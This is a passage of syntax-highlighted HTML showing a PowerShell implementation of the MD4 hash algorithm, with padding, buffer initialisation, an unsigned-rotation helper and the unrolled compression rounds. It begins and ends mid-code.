class="hljs-selector-tag">@</span>([<span class="hljs-type">BitConverter</span>]::GetBytes(<span class="hljs-variable">$Array</span>.Count * <span class="hljs-number">8</span>)).CopyTo(<span class="hljs-variable">$M</span>, <span class="hljs-variable">$M</span>.Count - <span class="hljs-number">8</span>)<br><br>    <span class="hljs-comment"># message digest buffer (A,B,C,D)</span><br>    <span class="hljs-variable">$A</span> = [<span class="hljs-type">Convert</span>]::ToUInt32(<span class="hljs-string">&#x27;0x67452301&#x27;</span>, <span class="hljs-number">16</span>)<br>    <span class="hljs-variable">$B</span> = [<span class="hljs-type">Convert</span>]::ToUInt32(<span class="hljs-string">&#x27;0xefcdab89&#x27;</span>, <span class="hljs-number">16</span>)<br>    <span class="hljs-variable">$C</span> = [<span class="hljs-type">Convert</span>]::ToUInt32(<span class="hljs-string">&#x27;0x98badcfe&#x27;</span>, <span class="hljs-number">16</span>)<br>    <span class="hljs-variable">$D</span> = [<span class="hljs-type">Convert</span>]::ToUInt32(<span class="hljs-string">&#x27;0x10325476&#x27;</span>, <span class="hljs-number">16</span>)<br>    <br>    <span class="hljs-comment"># There is no unsigned number shift in C#, have to define one.</span><br>    <span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-TypeDefinition</span> <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">public class Shift</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  public static uint Left(uint a, int b)</span><br><span class="hljs-string">    &#123;</span><br><span class="hljs-string">        return ((a &lt;&lt; b) | (((a &gt;&gt; 1) &amp; 0x7fffffff) &gt;&gt; (32 - b - 1)));</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;@</span><br><br>    <span class="hljs-comment"># define 3 auxiliary functions</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FF</span><span class="hljs-params">([uint32]<span class="hljs-variable">$X</span>, [uint32]<span class="hljs-variable">$Y</span>, [uint32]<span class="hljs-variable">$Z</span>)</span></span><br>    &#123;<br>        ((<span class="hljs-variable">$X</span> <span class="hljs-operator">-band</span> <span class="hljs-variable">$Y</span>) <span class="hljs-operator">-bor</span> ((<span class="hljs-operator">-bnot</span> <span class="hljs-variable">$X</span>) <span class="hljs-operator">-band</span> <span class="hljs-variable">$Z</span>))<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GG</span><span class="hljs-params">([uint32]<span class="hljs-variable">$X</span>, [uint32]<span class="hljs-variable">$Y</span>, [uint32]<span class="hljs-variable">$Z</span>)</span></span><br>    &#123;<br>        ((<span class="hljs-variable">$X</span> <span class="hljs-operator">-band</span> <span class="hljs-variable">$Y</span>) <span class="hljs-operator">-bor</span> (<span class="hljs-variable">$X</span> <span class="hljs-operator">-band</span> <span class="hljs-variable">$Z</span>) <span class="hljs-operator">-bor</span> (<span class="hljs-variable">$Y</span> <span class="hljs-operator">-band</span> <span class="hljs-variable">$Z</span>))<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">HH</span><span class="hljs-params">([uint32]<span class="hljs-variable">$X</span>, [uint32]<span class="hljs-variable">$Y</span>, [uint32]<span class="hljs-variable">$Z</span>)</span></span>&#123;<br>        (<span class="hljs-variable">$X</span> <span class="hljs-operator">-bxor</span> <span class="hljs-variable">$Y</span> <span class="hljs-operator">-bxor</span> <span class="hljs-variable">$Z</span>)<br>    &#125;<br>    <span class="hljs-comment"># processing message in one-word blocks</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$M</span>.Count; <span class="hljs-variable">$i</span> += <span class="hljs-number">64</span>)<br>    &#123;<br>        <span class="hljs-comment"># Save a copy of A/B/C/D</span><br>        <span class="hljs-variable">$AA</span> = <span class="hljs-variable">$A</span><br>        <span class="hljs-variable">$BB</span> = <span class="hljs-variable">$B</span><br>        <span class="hljs-variable">$CC</span> = <span class="hljs-variable">$C</span><br>        <span class="hljs-variable">$DD</span> = <span class="hljs-variable">$D</span><br><br>        <span class="hljs-comment"># Round 1 start</span><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">0</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">3</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">7</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">7</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">8</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">11</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">11</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">12</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">15</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">19</span>)<br><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">16</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">19</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">20</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">23</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">7</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">24</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">27</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">11</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">28</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">31</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">19</span>)<br><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">32</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">35</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">36</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">39</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">7</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">40</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">43</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">11</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">44</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">47</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">19</span>)<br><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">48</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">51</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">52</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">55</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">7</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">56</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">59</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">11</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (FF <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">60</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">63</span>)], <span class="hljs-number">0</span>)) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">19</span>)<br>        <span class="hljs-comment"># Round 1 end</span><br>        <span class="hljs-comment"># Round 2 start</span><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">0</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">3</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">16</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">19</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">5</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">32</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">35</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">9</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">48</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">51</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">13</span>)<br><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">7</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">20</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">23</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">5</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">36</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">39</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">9</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">52</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">55</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">13</span>)<br><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">8</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">11</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">24</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">27</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">5</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">40</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">43</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">9</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">56</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">59</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">13</span>)<br><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">12</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">15</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">28</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">31</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">5</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">44</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">47</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">9</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (GG <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">60</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">63</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x5A827999) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">13</span>)<br>        <span class="hljs-comment"># Round 2 end</span><br>        <span class="hljs-comment"># Round 3 start</span><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">0</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">3</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">32</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">35</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">9</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span 